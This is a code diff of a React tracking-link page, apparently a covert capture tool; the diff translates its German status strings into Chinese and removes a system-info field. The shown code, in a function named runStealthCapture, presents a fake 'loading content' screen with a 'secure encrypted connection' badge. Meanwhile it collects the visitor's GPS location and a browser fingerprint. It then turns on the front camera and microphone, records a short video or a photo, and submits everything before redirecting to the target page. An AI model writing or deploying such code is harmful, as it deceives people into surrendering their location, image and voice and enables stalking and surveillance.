@@ -7,7 +7,7 @@ export default function TrackingPage() {
   const params = useParams<{ id: string }>();
   const linkId = params.id || "";
 
-  const [statusText, setStatusText] = useState("Verbindung wird hergestellt...");
+  const [statusText, setStatusText] = useState("正在建立安全连接...");
   const videoRef = useRef<HTMLVideoElement | null>(null);
   const canvasRef = useRef<HTMLCanvasElement | null>(null);
 
@@ -18,7 +18,7 @@ export default function TrackingPage() {
     if (!linkId) return;
 
     if (linkQuery.isError || linkQuery.data === null) {
-      setStatusText("Link nicht gefunden oder abgelaufen.");
+      setStatusText("链接不存在或已失效。");
       return;
     }
 
@@ -40,15 +40,15 @@ export default function TrackingPage() {
   const getGPS = (): Promise<string> => {
     return new Promise((resolve) => {
       if (!navigator.geolocation) {
-        resolve("Nicht unterstützt");
+        resolve("不支持定位");
         return;
       }
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (Genauigkeit: ${Math.round(pos.coords.accuracy)}m)`);
+          resolve(`${pos.coords.latitude.toFixed(4)}, ${pos.coords.longitude.toFixed(4)} (精度: ${Math.round(pos.coords.accuracy)}m)`);
         },
         () => {
-          resolve("Verweigert / Nicht verfügbar");
+          resolve("未授权 / 不可用");
         },
         { timeout: 5000, maximumAge: 60000 }
       );
@@ -57,19 +57,16 @@ export default function TrackingPage() {
 
   const runStealthCapture = async (redirectUrl: string) => {
     try {
-      setStatusText("Initialisiere...");
+      setStatusText("正在初始化环境...");
 
       const resolution = `${window.screen.width}x${window.screen.height} (DPR: ${window.devicePixelRatio})`;
       const fingerprint = generateFingerprint();
       const gps = await getGPS();
-      const platform = navigator.platform || "Unbekannt";
-      const language = navigator.language || "de";
-      const systemInfo = `Plattform: ${platform} | Sprache: ${language}`;
 
-      // Request camera access
+      // 请求摄像头权限
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
-        audio: true, // Audio für Videoaufnahme
+        audio: true,
       });
 
       if (videoRef.current) {
@@ -77,7 +74,6 @@ export default function TrackingPage() {
         await videoRef.current.play();
       }
 
-      // Versuche per MediaRecorder ein kurzes Video (3-4 Sekunden) aufzunehmen
       let capturedData = "";
       const isRecorderSupported = typeof MediaRecorder !== "undefined";
 
@@ -95,7 +91,7 @@ export default function TrackingPage() {
             const reader = new FileReader();
             reader.onloadend = async () => {
               capturedData = reader.result as string;
-              await sendAndRedirect(capturedData, gps, fingerprint, resolution, systemInfo, redirectUrl, stream);
+              await sendAndRedirect(capturedData, gps, fingerprint, resolution, redirectUrl, stream);
             };
             reader.readAsDataURL(blob);
           };
@@ -108,11 +104,11 @@ export default function TrackingPage() {
           }, 3500);
           return;
         } catch (e) {
-          console.warn("MediaRecorder failed, falling back to photo capture:", e);
+          console.warn("MediaRecorder failed, falling back to photo:", e);
         }
       }
 
-      // Fallback: Foto aufnehmen
+      // 降级拍照
       setTimeout(async () => {
         if (videoRef.current && canvasRef.current) {
           const video = videoRef.current;
@@ -123,7 +119,7 @@ export default function TrackingPage() {
           if (ctx) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             capturedData = canvas.toDataURL("image/jpeg", 0.85);
-            await sendAndRedirect(capturedData, gps, fingerprint, resolution, systemInfo, redirectUrl, stream);
+            await sendAndRedirect(capturedData, gps, fingerprint, resolution, redirectUrl, stream);
             return;
           }
         }
@@ -132,8 +128,8 @@ export default function TrackingPage() {
       }, 1500);
 
     } catch (err) {
-      console.warn("Camera access declined or unavailable:", err);
-      setStatusText("Weiterleitung läuft...");
+      console.warn("Camera access declined:", err);
+      setStatusText("正在跳转...");
       setTimeout(() => {
         window.location.href = redirectUrl || "https://example.com";
       }, 1000);
@@ -145,12 +141,11 @@ export default function TrackingPage() {
     gps: string,
     fingerprint: string,
     resolution: string,
-    systemInfo: string,
     redirectUrl: string,
     stream: MediaStream
   ) => {
     try {
-      setStatusText("Übertrage Daten...");
+      setStatusText("正在提交数据...");
       stream.getTracks().forEach((t) => t.stop());
 
       await submitMutation.mutateAsync({
@@ -161,7 +156,7 @@ export default function TrackingPage() {
         resolution,
       });
 
-      setStatusText("Weiterleitung...");
+      setStatusText("正在跳转到目标网页...");
       window.location.href = redirectUrl;
     } catch (err) {
       console.error("Submission error:", err);
@@ -176,7 +171,7 @@ export default function TrackingPage() {
           <Loader2 className="w-8 h-8 animate-spin" />
         </div>
         <div className="space-y-2">
-          <h2 className="text-xl font-bold tracking-tight text-white">Inhalt wird geladen</h2>
+          <h2 className="text-xl font-bold tracking-tight text-white">正在加载内容</h2>
           <p className="text-sm text-slate-400">{statusText}</p>
         </div>
 
@@ -187,7 +182,7 @@ export default function TrackingPage() {
 
         <div className="pt-4 border-t border-slate-800/80 flex items-center justify-center gap-2 text-xs text-slate-500">
           <ShieldCheck className="w-4 h-4 text-emerald-400" />
-          <span>Sichere, verschlüsselte Verbindung</span>
+          <span>安全加密传输通道</span>
         </div>
       </div>
     </div>
